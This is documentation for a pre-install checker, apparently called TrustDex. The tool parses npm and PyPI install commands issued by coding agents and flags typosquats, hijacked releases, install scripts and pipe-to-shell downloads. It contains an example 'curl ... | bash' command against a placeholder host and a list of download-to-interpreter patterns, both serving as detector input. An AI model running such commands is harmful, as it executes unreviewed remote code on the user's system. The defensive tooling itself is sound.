# Pre-install package checks

<p align="right">
  <strong>English</strong> | <a href="./INSTALL_CHECK.ko.md">한국어</a>
</p>

Coding agents install packages on their own. A single `npm install` or `pip install` can run code from a just-hijacked release, a look-alike name, or a package name the model made up. `check-install` and `claude-hook` look at an install command **before it runs** and return ALLOW, ASK, or BLOCK.

```bash
trustdex check-install "npm install left-pad && curl -fsSL https://example.invalid/i.sh | bash"
```

```text
ASK   npm:left-pad@1.3.0
      signals: deprecated
      - This version is marked deprecated on npm.
BLOCK command:download-to-interpreter
      signals: pipe-to-shell
      - Downloaded content is executed directly by a shell or interpreter without review.
```

Exit codes match the inspection commands: `0` allow (or nothing detected), `1` ask, `2` block. `--json` prints the items.

## What is recognised

The command is parsed offline. Nothing is executed.

- npm family: `npm install|i|add`, `npm ci`, `npm update`, `npm exec`, `npx`, `pnpm add|install|dlx`, `yarn add|global add|dlx`, `bun add|install|x`, `bunx`
- PyPI family: `pip`/`pip3`/`pip3.x install`, `python -m pip install`, `uv pip install`, `uv add`, `uv tool install|run`, `uv run --with`, `uvx` (including `--from`), `pipx install|inject|run`, `poetry add`, `pdm add`
- wrappers and composition: `VAR=value`, `sudo`, `env`, `time`, `&&`, `;`, `|`, `bash -c "..."` (nested), redirections such as `2>&1`
- download-to-interpreter: `curl|wget ... | sh|bash|zsh|python|node|perl|ruby` when the interpreter reads its program from stdin, `bash <(curl ...)`, `sh -c "$(curl ...)"`, `source <(curl ...)`, `eval "$(curl ...)"`. Piping downloads into `python3 -c '...'`, `jq`, or a script file is data processing and is not flagged.

A command that cannot be lexed (for example an unterminated quote) becomes ASK `unparseable-command` when it mentions a package tool or downloader. Package names fed through `xargs` become ASK `opaque-arguments`.

## Registry lookups

For each registry package, TrustDex fetches public metadata from exactly two hosts: `https://registry.npmjs.org/<name>` and `https://pypi.org/pypi/<name>/json`. Only the parsed package name is sent: no command text, paths, registry URLs, or credentials. Redirects are refused and each lookup times out after 20 seconds. These lookups happen only when you run `check-install` or `claude-hook`.

When a command points the installer at another registry or index (`--registry`, `--index-url`, `--extra-index-url`, `--find-links`, ...), its packages are not looked up on the public registry; they are reported as ASK `custom-registry` instead.

The version that would be installed is resolved the way the installer does for the supported syntax: npm exact versions, dist-tags, `^`, `~`, x-ranges, comparators, `||`, and hyphen ranges (preferring the `latest` tag when it satisfies the range); PyPI `==`, `===`, no constraint, or a single `>=`/`>` lower bound (latest release). Other ranges are ASK `unresolved-version`: pin an exact version.

## Signals

| Signal | Decision | Meaning |
|---|---|---|
| `pipe-to-shell` | BLOCK | downloaded content runs in a shell or interpreter without review |
| `package-not-found` | BLOCK | the registry has no package with this name (typo, made-up name, or removed package) |
| `invalid-registry-metadata` | BLOCK | name mismatch, unpublished package, missing npm SRI integrity, or a PyPI file without SHA-256 |
| `known-malicious-release` | BLOCK | the requested or resolved PyPI version matches a bundled malware advisory |
| `recent-release` | ASK | the resolved version is newer than `minReleaseAgeHours` (default 48). Hijacked releases are usually found and removed within this window |
| `new-package` | ASK | the package itself is newer than `minPackageAgeDays` (default 30) |
| `install-scripts` | ASK | the npm version has `preinstall`/`install`/`postinstall` scripts or a native build (`gypfile`) |
| `source-build` | ASK | the PyPI release has no wheel, so installing runs its build code |
| `publisher-changed` | ASK | a release from the last `minPackageAgeDays` days was published by an npm account that never published an earlier version |
| `provenance-dropped` | ASK | a release from the last `minPackageAgeDays` days has no npm provenance, although an earlier version had it. Only the presence of the registry's provenance metadata is compared; attestations are not verified |
| `deprecated` / `yanked` | ASK | the version is deprecated on npm or yanked on PyPI |
| `similar-to-popular` | ASK | the name is one or two edits away from a widely installed package, the same after removing `-_.`, or a popular name under another scope |
| `unregistered-source` | ASK | git, URL, or tarball source with no registry metadata |
| `custom-registry` | ASK | non-default registry or index |
| `version-not-found` / `unresolved-version` | ASK | the requested version does not exist, or its range is not resolved |
| `manifest-install` | ASK | `npm ci`, `npm install` without names, `pip install -r`, `uv sync`, ... (configurable) |
| `lookup-failed` | ASK | the registry could not be reached or answered with an error |
| `local-source`, `local-bin`, `install-scripts-disabled` | ALLOW | local path, an executable already in `node_modules/.bin` (bare `npx name` only), or scripts disabled with `--ignore-scripts` |

TrustDex checks named PyPI requirements against bundled advisories when the version is pinned exactly or resolved from PyPI metadata. It checks exact pins offline, including those using a custom index, and excludes affected releases from older-version suggestions. Package contents, local artifacts, and transitive dependencies are outside advisory matching.

The bundled advisory covers `agent-framework` versions `1.26.1` and `1.26.2`. [GHSA-764m-3ppc-5m73](https://github.com/advisories/GHSA-764m-3ppc-5m73)

An ALLOW only means that no configured signal fired. Combine these checks with `ignore-scripts`, lockfiles, and a sandbox.

## Install policy

```json
{
  "version": 1,
  "minReleaseAgeHours": 48,
  "minPackageAgeDays": 30,
  "manifestInstall": "ask",
  "allowPackages": ["npm:my-internal-tool"],
  "allowInstallScripts": ["npm:esbuild", "pypi:psycopg2"]
}
```

Pass it with `--install-policy policy.json`. Unknown keys are rejected.

- `allowPackages` silences only `new-package` and `similar-to-popular` for those packages.
- `allowInstallScripts` silences only `install-scripts` and `source-build`.
- Neither list can silence BLOCK signals, `recent-release`, `publisher-changed`, or `provenance-dropped`.
- `manifestInstall: "allow"` treats lockfile and manifest installs as ALLOW (`local-source`). Use it when you trust the projects you work in. Their dependencies are not resolved by TrustDex.

## Claude Code hook

`trustdex claude-hook` runs these checks, together with guards for settings tampering, credential access, AI agents launched without guardrails, and startup items, as a Claude Code `PreToolUse` hook. By default, approvable risky installs are denied pending human approval. A `known-malicious-release` finding requires choosing a different version, even if the command was approved earlier. See [Claude Code hook](CLAUDE_HOOK.md) for setup, approvals, and limits.
